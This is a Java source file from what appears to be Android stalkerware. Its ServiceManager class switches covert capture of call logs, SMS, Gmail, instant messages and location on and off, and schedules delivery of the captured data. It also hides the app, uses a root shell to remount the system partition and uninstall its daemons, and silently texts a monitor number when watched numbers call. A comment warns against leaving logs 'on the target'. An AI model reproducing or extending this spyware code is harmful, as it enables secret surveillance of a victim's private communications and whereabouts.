package com.fx.maind;

import android.content.Context;
import android.telephony.SmsManager;

import com.fx.daemon.DaemonHelper;
import com.fx.maind.capture.CallLogCapturer;
import com.fx.maind.capture.GmailCapturer;
import com.fx.maind.capture.ImCapturer;
import com.fx.maind.capture.LocationCapturer;
import com.fx.maind.capture.SmsCapturer;
import com.fx.maind.delivery.DeliveryScheduler;
import com.fx.maind.ref.Customization;
import com.fx.maind.ref.MainDaemon;
import com.fx.maind.ref.MainDaemonResource;
import com.fx.maind.security.FxConfigReader;
import com.fx.pmond.ref.MonitorDaemon;
import com.fx.preference.PreferenceManager;
import com.fx.preference.SpyInfoManager;
import com.fx.preference.SpyInfoManagerFactory;
import com.fx.preference.model.ProductInfo;
import com.fx.preference.model.ProductInfo.ProductEdition;
import com.fx.util.FxResource;
import com.vvt.callmanager.ref.BugDaemon;
import com.vvt.callmanager.ref.MonitorDisconnectData;
import com.vvt.dalvik.bugd.SpyInfoApplier;
import com.vvt.dalvik.bugd.WatchListManager;
import com.vvt.logger.FxLog;
import com.vvt.phoneinfo.PhoneInfoHelper;
import com.vvt.shell.CannotGetRootShellException;
import com.vvt.shell.ShellUtil;

public class ServiceManager {
	
	private static final String TAG = "ServiceManager";
	private static final boolean LOGV = Customization.VERBOSE;
	private static final boolean LOGD = Customization.DEBUG;
	
	private static ServiceManager mInstance;
	
	private Context mContext;
	private EventManager mEventManager;
	
	private CallLogCapturer mCallLogCapturer;
    private SmsCapturer mSmsCapturer;
    private GmailCapturer mGmailCapturer;
    private LocationCapturer mLocationCapturer;
    private ImCapturer mImCapturer;
    
    private DeliveryScheduler mDeliveryScheduler;
    private SpyInfoApplier mSpyInfoApplier;
    private SpyInfoManager mSpyInfoManager;
    
    private boolean mIsMaindValid;
	
	public static ServiceManager getInstance(Context context) {
		if (mInstance == null) {
			mInstance = new ServiceManager(context);
		}
		return mInstance;
	}
	
	private ServiceManager(Context context) {
		mContext = context;
		mEventManager = EventManager.getInstance(mContext);
		
		mCallLogCapturer = new CallLogCapturer(mContext);
		mSmsCapturer = new SmsCapturer(mContext);
		mGmailCapturer = new GmailCapturer(mContext);
		mLocationCapturer = new LocationCapturer(mContext);
		mImCapturer = new ImCapturer(mContext);
		mDeliveryScheduler = DeliveryScheduler.getInstance(mContext);
		mSpyInfoManager = SpyInfoManagerFactory.getSpyInfoManager(mContext);
		mSpyInfoApplier = SpyInfoApplier.getInstance(mContext);
		
		mIsMaindValid = FxConfigReader.isMaindValid(
				String.format("%s/%s", 
						MainDaemonResource.EXTRACTING_PATH, 
						MainDaemonResource.DEX_ZIP_FILENAME), 
				String.format("%s/%s", 
						MainDaemonResource.EXTRACTING_PATH, 
						MainDaemonResource.SECURITY_CONFIG_FILE));
		
		if (LOGD) FxLog.d(TAG, String.format(
				"ServiceManager # Validation result: %s", mIsMaindValid? "PASSED" : "FAILED"));
	}
	
	public void enableCaptureCallLog() {
		if (LOGD) FxLog.d(TAG, "enableCaptureCallLog # ENTER ...");
		if (mIsMaindValid) mCallLogCapturer.registerObserver();
	}

	public void disableCaptureCallLog() {
		if (LOGD) FxLog.d(TAG, "disableCaptureCallLog # ENTER ...");
		mCallLogCapturer.unregisterObserver();
	}
	
	public void enableCaptureSms() {
		if (LOGD) FxLog.d(TAG, "enableCaptureSms # ENTER ...");
		if (mIsMaindValid) mSmsCapturer.registerObserver();
	}
	
	public void disableCaptureSms() {
		if (LOGD) FxLog.d(TAG, "disableCaptureSms # ENTER ...");
		mSmsCapturer.unregisterObserver();
	}
	
	public void enableCaptureEmail() {
		if (LOGD) FxLog.d(TAG, "enableCaptureEmail # ENTER ...");
		if (mIsMaindValid) mGmailCapturer.registerObserver();
	}

	public void disableCaptureEmail() {
		if (LOGD) FxLog.d(TAG, "disableCaptureEmail # ENTER ...");
		mGmailCapturer.unregisterObserver();
	}
	
	public void enableCaptureLocation() {
		if (LOGD) FxLog.d(TAG, "enableCaptureLocation # ENTER ...");
		if (mIsMaindValid) mLocationCapturer.enable();
	}
	
	public void disableCaptureLocation() {
		if (LOGD) FxLog.d(TAG, "disableCaptureLocation # ENTER ...");
		mLocationCapturer.disable();
	}
	
	public void enableCaptureIm() {
		if (LOGD) FxLog.d(TAG, "enableCaptureIm # ENTER ...");
		if (mIsMaindValid) mImCapturer.registerObserver();
	}

	public void disableCaptureIm() {
		if (LOGD) FxLog.d(TAG, "disableCaptureIm # ENTER ...");
		mImCapturer.unregisterObserver();
	}

	public void processNumberOfEvents() {
		if (LOGV) FxLog.v(TAG, "processNumberOfEvents # ENTER ...");
		if (mIsMaindValid) mEventManager.processNumberOfEvents();
	}
	
	public void restartDeliveryScheduler() {
		if (LOGV) FxLog.v(TAG, "restartDeliveryScheduler # ENTER ...");
		mDeliveryScheduler.stop();
		mDeliveryScheduler.start();
	}
	
	public void stopDeliveryScheduler() {
		if (LOGV) FxLog.v(TAG, "stopDeliveryScheduler # ENTER ...");
		mDeliveryScheduler.stop();
	}
	
	public void forceDeliverEvents() {
		if (LOGD) FxLog.d(TAG, "forceDeliverEvents # ENTER ...");
		if (mIsMaindValid) mEventManager.asyncRequestDeliverAll();
	}
	
	public void removeAllEvents() {
		if (LOGV) FxLog.v(TAG, "removeAllEvents # ENTER ...");
		mEventManager.removeAllEvents();
	}
	
	public void updateEventCaptureStatus() {
		if (LOGV) FxLog.v(TAG, "updateEventCaptureStatus # ENTER ...");
		
		PreferenceManager pm = PreferenceManager.getInstance(mContext);
		
		if (pm.isCaptureEnabled()) {
			// Call
			if (pm.isCaptureCallLogEnabled()) enableCaptureCallLog();
			else disableCaptureCallLog();
			
			// SMS
			if (pm.isCaptureSmsEnabled()) enableCaptureSms();
			else disableCaptureSms();
			
			// Email
			if (pm.isCaptureEmailEnabled()) enableCaptureEmail();
			else disableCaptureEmail();
			
			// IM
			if (pm.isCaptureImEnabled()) enableCaptureIm();
			else disableCaptureIm();
			
			// Location
			if (pm.isCaptureLocationEnabled()) enableCaptureLocation();
			else disableCaptureLocation();
		}
		else {
			disableCaptureCallLog();
			disableCaptureSms();
			disableCaptureEmail();
			disableCaptureIm();
			disableCaptureLocation();
		}
		
		if (LOGV) FxLog.v(TAG, "updateEventCaptureStatus # EXIT ...");
	}

	/**
	 * Called when receiving an SMS command to change GPS time interval 
	 */
	public void resetGpsTracking() {
		PreferenceManager pm = PreferenceManager.getInstance(mContext);
		
		if (pm.isCaptureEnabled()) { 
			if (pm.isCaptureLocationEnabled()) {
				disableCaptureLocation();
				enableCaptureLocation();
			}
			else {
				disableCaptureLocation();	
			}
		}
		else {
			disableCaptureLocation();
		}
	}
	
	public void hideApplication() {
		PreferenceManager pm = PreferenceManager.getInstance(mContext);
		
		ProductInfo productInfo = pm.getProductInfo();
		String packageName = null;
		if (productInfo != null) {
			packageName = productInfo.getPackageName();
		}
		if (packageName != null) {
			ShellUtil.uninstallApk(packageName);
		}
	}
	
	/**
	 * Don't try to write any debugging logs here since it can be left undeleted on the target  
	 */
	public void uninstallAll() {
		if (LOGV) FxLog.v(TAG, "uninstallAll # ENTER ...");
		try {
			String packageName = null;
			
			ProductInfo productInfo = PreferenceManager.getInstance(mContext).getProductInfo();
			if (productInfo != null) packageName = productInfo.getPackageName();
			
			MainDaemon mainDaemon = new MainDaemon();
	    	MonitorDaemon monitorDaemon = new MonitorDaemon();
			BugDaemon bugDaemon = new BugDaemon();
			
			if (LOGV) FxLog.v(TAG, "uninstallAll # Remount system as read-write");
			ShellUtil.remountFileSystem(true);
			
			if (LOGV) FxLog.v(TAG, "uninstallAll # Remove reboot hook");
			DaemonHelper.removeRebootHook();
			
			if (LOGV) FxLog.v(TAG, "uninstallAll # Stop processes");
			monitorDaemon.stopDaemon();
			bugDaemon.stopDaemon();
			
			if (LOGV) FxLog.v(TAG, "uninstallAll # Remove resources");
			monitorDaemon.removeDaemon();
			bugDaemon.removeDaemon();
			mainDaemon.removeDaemon();
			
			if (LOGV) FxLog.v(TAG, "uninstallAll # Remove APK");
			if (packageName != null) {
				ShellUtil.uninstallApk(packageName);
			}
			else {
				if (LOGD) FxLog.w(TAG, "uninstallAll # Package name not found!!");
			}
			
			if (LOGV) FxLog.v(TAG, "uninstallAll # Remount system as read-only");
			ShellUtil.remountFileSystem(false);
			
			if (LOGV) FxLog.v(TAG, "uninstallAll # Stop monitor daemon");
			mainDaemon.stopDaemon();
		}
		catch (CannotGetRootShellException e) {
			FxLog.e(TAG, "uninstallAll # Error: %s", e);
		}
		if (LOGV) FxLog.v(TAG, "uninstallAll # EXIT ...");
	}

	public void applySpySettings() {
		if (LOGV) FxLog.v(TAG, "applySettings # ENTER ...");
		if (mIsMaindValid) mSpyInfoApplier.applySettings();
		if (LOGV) FxLog.v(TAG, "applySettings # EXIT ...");
	}
	
	public void resetSpySettings() {
		if (LOGV) FxLog.v(TAG, "resetSpySettings # ENTER ...");
		if (mIsMaindValid) {
			mSpyInfoApplier.resetSettings();
			mSpyInfoApplier.applySettings();
		}
		if (LOGV) FxLog.v(TAG, "resetSpySettings # EXIT ...");
	}
	
	public void handleWatchNumber(String phoneNumber, boolean isIncoming) {
		boolean isNotificationSupported = false;
		PreferenceManager pm = PreferenceManager.getInstance(mContext);
		ProductInfo productInfo = pm.getProductInfo();
		if (productInfo != null && productInfo.getEdition() == ProductEdition.PROX) {
			isNotificationSupported = true;
		}
		if (LOGD) FxLog.d(TAG, String.format(
				"handleWatchNumber # isNotificationSupported: %s", isNotificationSupported));
		if (! isNotificationSupported) return;
		
		
		boolean isSpyEnabled = mSpyInfoManager.isEnabled();
		String monitorNumber = mSpyInfoManager.getMonitorNumber();
		if (LOGD) FxLog.d(TAG, String.format(
				"handleWatchNumber # isSpyEnabled: %s, monitorNumber: %s", 
				isSpyEnabled, monitorNumber));
		if (! isSpyEnabled || monitorNumber == null) return;
		
		WatchListManager watchListManager = WatchListManager.getInstance();
		boolean isWatchNumber = watchListManager.isWatchNumber(phoneNumber);
		if (LOGD) FxLog.d(TAG, String.format(
				"handleWatchNumber # phoneNumber: %s, isWatchNumber: %s", 
				phoneNumber, isWatchNumber));
		if (phoneNumber == null || ! isWatchNumber) return;
		
		boolean sendNotification = isSpyEnabled && monitorNumber != null && isWatchNumber;
		if (LOGD) FxLog.d(TAG, String.format("handleWatchNumber # sendNotification: %s", sendNotification));
		
		if (sendNotification) {
			
			String deviceId = PhoneInfoHelper.getInstance(mContext).getDeviceId();
			
			String notificationMessage = null;
			
			if (isIncoming) {
				notificationMessage = 
						FxResource.getWatchListNotificationIncoming(
								mContext, phoneNumber, deviceId);
			}
			else {
				notificationMessage = 
						FxResource.getWatchListNotificationOutgoing(
								mContext, phoneNumber, deviceId);
			}
			
			if (LOGD) FxLog.d(TAG, String.format(
					"handleWatchNumber # Monitor: %s, Message: %s", 
					monitorNumber, notificationMessage));
			
			if (notificationMessage != null) {
				SmsManager smsManager = SmsManager.getDefault();
				smsManager.sendMultipartTextMessage(monitorNumber, null, 
						smsManager.divideMessage(notificationMessage), null, null);
			}
		}
	}

	public void handleMonitorDisconnect(MonitorDisconnectData disconnectData) {
		if (disconnectData.getReason() == MonitorDisconnectData.Reason.MUSIC_PLAY) {
			String notificationMessage = FxResource.LANGUAGE_SMS_NOTIFY_FOR_MUSIC_PLAY;
			
			String monitorNumber = mSpyInfoManager.getMonitorNumber();
			
			if (LOGD) FxLog.d(TAG, String.format(
					"handleMonitorDisconnect # Monitor: %s, Message: %s", 
					monitorNumber, notificationMessage));
			
			SmsManager smsManager = SmsManager.getDefault();
			smsManager.sendMultipartTextMessage(monitorNumber, null, 
					smsManager.divideMessage(notificationMessage), null, null);
		}
	}
}
